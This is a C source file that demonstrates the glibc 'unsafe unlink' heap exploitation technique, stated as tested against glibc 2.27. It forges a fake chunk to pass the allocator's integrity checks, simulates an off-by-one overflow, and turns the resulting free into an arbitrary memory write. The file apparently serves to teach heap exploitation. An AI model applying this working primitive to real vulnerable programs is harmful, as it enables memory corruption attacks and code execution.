/**
 * unlink() exploit that bypasses the hardening techniques:
 * 1. P->size == next_chunk(P)->prev_size
 * 2. P->fd->bk == P && P->bk->fd == P
 * Tested against 2.27 (Should also work up to, including, glibc-2.32))
 */

#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>
#include <string.h>
#include <assert.h>

struct malloc_chunk;
typedef struct malloc_chunk* mchunkptr;

#define SIZE_SZ (sizeof (size_t))
#define chunk_to_raw(p)   ((void*)((char*)(p) + 2*SIZE_SZ))
#define raw_to_chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))

#define chunk_size(sz) ((sz)+2*SIZE_SZ)

struct malloc_chunk {

  // size of "previous" chunk
  //  (only valid when the previous chunk is freed, P=0)
  size_t      prev_size;  /* Size of previous chunk (if free).  */

  // size in bytes (aligned by double words): lower bits
  // indicate various states of the current/previous chunk
  //   A: alloced in a non-main arena
  //   M: mmapped
  //   P: "previous" in use (i.e., P=0 means freed)
  size_t      size;       /* Size in bytes, including overhead. */

  // double links for free chunks in small/large bins
  //  (only valid when this chunk is freed)
  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;

  /* Only used for large blocks: pointer to next larger size.  */
  // double links for next larger/smaller size in largebins
  //  (only valid when this chunk is freed)
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};

void vuln(size_t sz, void *dst, size_t val);
char ar[9];

int main() {
    size_t sz = 0x420;   //we want to be big enough not to use tcache or fastbin. 
    strcpy(ar, "BBBBBBBB");

    printf("Original Value: %s\n", ar);
    printf("Array Address : %p\n", ar);
    vuln(sz, ar, (size_t)0x4141414141414141LL);
    printf("New Value     : %s\n", ar);
}

void vuln(size_t sz, void *dst, size_t val) {
    //Requires a leak primitive in order to leak p1's address
    //
    //The `unlink` exploit effectively changes the value of the variable p1. (i.e. it will no longer point to the heap, but, relatively to a fixed offset from itself!)
    //We assume that the program uses update operations in the form of p1[i] (or just allows us to write anywhere in the allocated buffer).
    //So, with this assumption, we change p1 to point to an arbitrary address using the operation update p1[3] <==> *(p1+0x18)
    //Then, we perform the arbitrary write using the operation p1[0] <==> *(p1+0x00)

    // [PRE-CONDITION]
    //   sz : any non-fast-bin size
    //   dst: where to write (void*)
    //   val: target value
    // [BUG] buffer overflow (p1)
    // [POST-CONDITION] *dst = val
    void *p1 = malloc(sz);
    void *p2 = malloc(sz);
    struct malloc_chunk *fake = p1; //auxiliary variable so that we do not type-cast all the time

    //Here we manipulate p1
    // bypassing (1): P->size == next_chunk(P)->prev_size.
    // If fake_chunk->size = 0, next_chunk(fake)->prev_size
    // will point to fake->prev_size. By setting both values
    // zero, we can bypass the check. These assignements
    // can be ommitted since heap memory is zeroed out at
    // first time of execution.
    fake->prev_size = fake->size = 0;   //1. security check bypass

    // bypassing (2): P->fd->bk == P && P->bk->fd == P
    fake->fd = (void*)&p1 - offsetof(struct malloc_chunk, bk);    //2. security check bypass
    fake->bk = (void*)&p1 - offsetof(struct malloc_chunk, fd);    //2. security check bypass

    //Here we overflow p1 by one byte (off-by-one)
    // it shrinks the previous chunk’s size,
    // tricking ‘fake’ as the previous chunk
    struct malloc_chunk *c2 = raw_to_chunk(p2);
    c2->prev_size = chunk_size(sz) - offsetof(struct malloc_chunk, fd);

    // [BUG] overflowing p1 to modify c2’s size:
    // tricking the previous chunk freed, P=0
    c2->size &= ~1;

    //Here we "consolidate backward"
    //After this operation, `p1` variable will point to its address - 0x18!
    free(p2);
    assert(p1 == (void*)&p1 - offsetof(struct malloc_chunk, bk));

    //Attacker updates p1's data. 
    //Update *(p1+0x18) <=> `p1` variable, to contain the destination address
    // writing with p1: overwriting itself to dst
    *(void**)((void*)p1 + offsetof(struct malloc_chunk, bk)) = dst;   //p1 <-- dst
    assert(p1 == dst);
    printf("p1 points to  : %p\n", p1);

    //Update *(p1+0x00) to contain the target value
    // writing with p1: overwriting *dst with val
    *(void**)p1 = (void*)val;
    assert(memcmp(dst, &val, 8) == 0);
}
